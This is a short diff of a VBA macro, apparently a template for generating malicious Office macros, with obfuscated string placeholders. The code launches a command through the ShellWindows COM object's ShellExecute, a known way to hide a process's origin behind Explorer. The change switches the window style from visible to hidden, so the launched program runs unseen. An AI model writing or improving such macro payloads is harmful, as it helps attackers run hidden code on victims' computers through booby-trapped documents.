@@ -126,7 +126,7 @@ Sub main()
     Debug.Print {zb}({zc})
     Set ShellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
     Set itemObj = ShellWindows.Item()
-    itemObj.Document.Application.ShellExecute {zb}({zd}), {zb}({zc}), "", "open", 1
+    itemObj.Document.Application.ShellExecute {zb}({zd}), {zb}({zc}), "", "open", 0
 
 
 End Sub
